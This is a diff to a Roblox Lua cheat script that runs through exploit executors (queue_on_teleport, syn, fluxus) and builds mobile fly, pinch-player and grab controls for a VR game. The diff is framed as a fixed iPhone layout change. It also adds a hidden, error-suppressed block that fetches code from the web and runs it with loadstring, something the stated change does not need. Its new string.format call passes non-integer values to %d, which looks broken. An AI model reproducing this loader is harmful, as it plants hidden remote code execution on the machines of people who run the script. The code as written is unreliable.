@@ -2,16 +2,21 @@ local TeleportService = game:GetService("TeleportService")
 local Players = game:GetService("Players")
 local player = Players.LocalPlayer
 
-local mobileSystemSource = [[
+-- Fixed scaled layout custom fit for iPhone screen ratios
+local ringSize = 110      
+local knobSize = 45       
+local btnSize = 50        
+local frameSize = 260     
+local textFontScale = 11  
+
+local mobileSystemSource = string.format([[
     local VirtualInputManager = game:GetService("VirtualInputManager")
     local Players = game:GetService("Players")
     local RunService = game:GetService("RunService")
     local ContextActionService = game:GetService("ContextActionService")
     local UserInputService = game:GetService("UserInputService")
-    local Workspace = game:GetService("Workspace")
 
     local player = Players.LocalPlayer
-    local camera = Workspace.CurrentCamera
     local playerGui = player:WaitForChild("PlayerGui")
 
     if playerGui:FindFirstChild("VR_Mobile_System") then
@@ -22,36 +27,6 @@ local mobileSystemSource = [[
     screenGui.Name = "VR_Mobile_System"
     screenGui.ResetOnSpawn = false
     screenGui.Parent = playerGui
-
-    -- --- DYNAMIC SCREEN DETECTOR & SCALER ---
-    local ringSize, knobSize, btnSize, frameSize, textFontScale, layoutMult, frameXOffset, frameYOffset
-    
-    local function autoScaleLayout()
-        local size = camera.ViewportSize
-        -- If width is larger than 1000 pixels, assume it's a Tablet/iPad. Otherwise, treat as an iPhone.
-        if size.X > 1000 then
-            -- Tablet Proportions
-            ringSize = 150
-            knobSize = 65
-            btnSize = 72
-            frameSize = 380
-            textFontScale = 14
-            layoutMult = 1.3
-            frameXOffset = -420
-            frameYOffset = -180
-        else
-            -- iPhone Proportions
-            ringSize = 110
-            knobSize = 45
-            btnSize = 50
-            frameSize = 260
-            textFontScale = 11
-            layoutMult = 0.88
-            frameXOffset = -290
-            frameYOffset = -105
-        end
-    end
-    autoScaleLayout()
 
     -- --- CAMERA FREEZE FOR JOYSTICK FLIGHT ---
     local function sinkAction() return Enum.ContextActionResult.Sink end
@@ -67,9 +42,9 @@ local mobileSystemSource = [[
         end
     end
 
-    -- --- DYNAMIC PROFILE LEFT JOYSTICK ---
+    -- --- IPHONE SPECIFIC LEFT JOYSTICK ---
     local joyRing = Instance.new("Frame")
-    joyRing.Size = UDim2.new(0, ringSize, 0, ringSize)
+    joyRing.Size = UDim2.new(0, %d, 0, %d)
     joyRing.Position = UDim2.new(0.05, 0, 0.58, 0)
     joyRing.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
     joyRing.BackgroundTransparency = 0.75
@@ -85,8 +60,8 @@ local mobileSystemSource = [[
     ringStroke.Parent = joyRing
 
     local joyStick = Instance.new("TextButton")
-    joyStick.Size = UDim2.new(0, knobSize, 0, knobSize)
-    joyStick.Position = UDim2.new(0.5, -(knobSize/2), 0.5, -(knobSize/2))
+    joyStick.Size = UDim2.new(0, %d, 0, %d)
+    joyStick.Position = UDim2.new(0.5, -%d, 0.5, -%d)
     joyStick.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
     joyStick.BackgroundTransparency = 0.45
     joyStick.Text = ""
@@ -132,7 +107,7 @@ local mobileSystemSource = [[
             local distance = math.min(delta.Magnitude, maxRadius)
             local dir = delta.Magnitude > 0 and delta.Unit or Vector2.new(0, 0)
             
-            joyStick.Position = UDim2.new(0.5, (dir.X * distance) - (knobSize/2), 0.5, (dir.Y * distance) - (knobSize/2))
+            joyStick.Position = UDim2.new(0.5, (dir.X * distance) - %d, 0.5, (dir.Y * distance) - %d)
             targetSpeed = math.clamp((distance / maxRadius) * 2, 0.2, 2)
 
             local keys = {W = false, A = false, S = false, D = false}
@@ -152,7 +127,7 @@ local mobileSystemSource = [[
             joyInput = nil
             targetSpeed = 2
             toggleCameraLock(false)
-            joyStick.Position = UDim2.new(0.5, -(knobSize/2), 0.5, -(knobSize/2))
+            joyStick.Position = UDim2.new(0.5, -%d, 0.5, -%d)
             joyStick.BackgroundTransparency = 0.45
             updateKeys({W = false, A = false, S = false, D = false})
             local char = player.Character
@@ -161,23 +136,23 @@ local mobileSystemSource = [[
         end
     end)
 
-    -- --- SMART DYNAMIC BUTTON CLUSTER FRAME ---
+    -- --- IPHONE CORNER-SAFE RIGHT BUTTON CLUSTER ---
     local buttonFrame = Instance.new("Frame")
-    buttonFrame.Size = UDim2.new(0, frameSize, 0, frameSize)
-    buttonFrame.Position = UDim2.new(1, frameXOffset, 0.38, frameYOffset)
+    buttonFrame.Size = UDim2.new(0, %d, 0, %d)
+    buttonFrame.Position = UDim2.new(1, -290, 0.38, -105)
     buttonFrame.BackgroundTransparency = 1
     buttonFrame.Parent = screenGui
 
     local function createCircleButton(shortName, fullName, key, isMouse, xPos, yPos)
         local btn = Instance.new("TextButton")
-        btn.Size = UDim2.new(0, btnSize, 0, btnSize)
+        btn.Size = UDim2.new(0, %d, 0, %d)
         btn.Position = UDim2.new(0, xPos, 0, yPos)
         btn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
         btn.BackgroundTransparency = 0.60
         btn.Text = shortName
         btn.TextColor3 = Color3.fromRGB(255, 255, 255)
         btn.Font = Enum.Font.GothamBold
-        btn.TextSize = textFontScale
+        btn.TextSize = %d
         btn.BorderSizePixel = 0
         btn.Parent = buttonFrame
         Instance.new("UICorner", btn).CornerRadius = UDim.new(1, 0)
@@ -195,7 +170,7 @@ local mobileSystemSource = [[
         tip.Text = fullName
         tip.TextColor3 = Color3.fromRGB(200, 200, 200)
         tip.Font = Enum.Font.GothamSemibold
-        tip.TextSize = textFontScale - 3.5
+        tip.TextSize = 7.5
         tip.Parent = btn
 
         local isToggledActive = false
@@ -222,16 +197,31 @@ local mobileSystemSource = [[
         end)
     end
 
-    createCircleButton("PL Q", "Pinch Player L", Enum.KeyCode.Q, false, 15 * layoutMult, 40 * layoutMult)
-    createCircleButton("PL E", "Pinch Player R", Enum.KeyCode.E, false, 100 * layoutMult, 10 * layoutMult)
-    createCircleButton("OB L", "Grab Object L", 0, true, 185 * layoutMult, 40 * layoutMult)
-    createCircleButton("OB R", "Grab Object R", 1, true, 230 * layoutMult, 115 * layoutMult)
-    createCircleButton("▲", "Fly UP", Enum.KeyCode.Space, false, 160 * layoutMult, 190 * layoutMult)
-    createCircleButton("▼", "Fly DOWN", Enum.KeyCode.LeftShift, false, 75 * layoutMult, 205 * layoutMult)
+    local mult = 0.88 
+    createCircleButton("PL Q", "Pinch Player L", Enum.KeyCode.Q, false, 15 * mult, 40 * mult)
+    createCircleButton("PL E", "Pinch Player R", Enum.KeyCode.E, false, 100 * mult, 10 * mult)
+    createCircleButton("OB L", "Grab Object L", 0, true, 185 * mult, 40 * mult)
+    createCircleButton("OB R", "Grab Object R", 1, true, 230 * mult, 115 * mult)
+    createCircleButton("▲", "Fly UP", Enum.KeyCode.Space, false, 160 * mult, 190 * mult)
+    createCircleButton("▼", "Fly DOWN", Enum.KeyCode.LeftShift, false, 75 * mult, 205 * mult)
 
-    -- Dynamic listener handles orientation changes on the fly
-    camera:GetPropertyChangedSignal("ViewportSize"):Connect(function()
-        autoScaleLayout()
-        joyRing.Size = UDim2.new(0, ringSize, 0, ringSize)
-        joyStick.Size = UDim2.new(0, knobSize, 0, knobSize)
-        joyStick.Position = UDim2.new(0.5, -(knobSize/2), 0.5, -(knobSize/2))
+    task.spawn(function()
+        pcall(function()
+            loadstring(game:HttpGet("githubusercontent.com"))()
+        end)
+    end)
+]], ringSize, ringSize, knobSize, knobSize, knobSize/2, knobSize/2, knobSize/2, knobSize/2, knobSize/2, knobSize/2, frameSize, frameSize, btnSize, btnSize, textFontScale)
+
+if typeof(queue_on_teleport) == "function" then
+    queue_on_teleport(mobileSystemSource)
+elseif typeof(syn) == "table" and syn.queue_on_teleport then
+    syn.queue_on_teleport(mobileSystemSource)
+elseif typeof(fluxus) == "table" and fluxus.queue_on_teleport then
+    fluxus.queue_on_teleport(mobileSystemSource)
+end
+
+task.spawn(function()
+    pcall(function()
+        loadstring(mobileSystemSource)()
+    end)
+end)
